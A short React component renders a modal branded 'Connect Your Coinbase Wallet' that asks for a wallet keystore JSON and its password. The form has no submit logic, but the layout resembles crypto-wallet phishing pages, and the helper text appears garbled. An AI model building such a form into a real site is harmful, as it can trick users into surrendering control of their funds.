import React from 'react';
import styles from './KeystoreModal.module.css';

const KeystoreModal = ({ onClose }) => {
    return (
        <div className={styles.overlay} onClick={onClose}>
            <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
                <h2 className={styles.title}>Connect Your Coinbase Wallet</h2>
                <form className={styles.form}>
                    <label className={styles.label} htmlFor="keystoreJson">Input Keystore JSON</label>
                    <input 
                        type="text" 
                        id="keystoreJson" 
                        className={styles.input} 
                        placeholder="Enter Keystore JSON" 
                    />
                    <label className={styles.label} htmlFor="password">Enter Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        className={styles.input} 
                        placeholder="Enter Password" 
                    />
                    <p className={styles.helperText}>Several lines of text beginning with " " plus the password you used to encrypt it</p>
                    <button className={styles.button}>Connect Wallet</button>
                </form>
            </div>
        </div>
    );
}

export default KeystoreModal;
